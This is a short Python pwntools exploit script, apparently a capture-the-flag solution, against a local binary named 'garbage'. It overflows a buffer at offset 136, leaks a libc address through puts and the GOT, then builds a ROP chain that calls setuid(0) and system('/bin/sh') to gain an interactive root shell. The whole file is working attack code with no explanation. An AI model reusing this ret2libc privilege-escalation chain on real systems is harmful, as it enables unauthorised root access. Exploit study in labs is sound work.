#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./garbage")

offset = 136
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x40179b) # pop rdi; ret;
payload += p64(0x404028) # puts@got
payload += p64(0x401050) # puts@plt
payload += p64(0x401619) # main()

shell.sendline(payload)
shell.recvuntil(b"access denied.\n")

libc_base = u64(shell.recvline().strip().ljust(8, b"\x00")) - 0x809c0

payload  = b""
payload += junk
payload += p64(libc_base + 0x02155f) # pop rdi; ret;
payload += p64(0x0)                  # uid (root)
payload += p64(libc_base + 0x0e5970) # setuid()
payload += p64(libc_base + 0x02155f) # pop rdi; ret;
payload += p64(libc_base + 0x1b3e9a) # "/bin/sh"
payload += p64(libc_base + 0x04f440) # system()

shell.sendline(payload)
shell.recvuntil(b"access denied.\n")

shell.interactive()
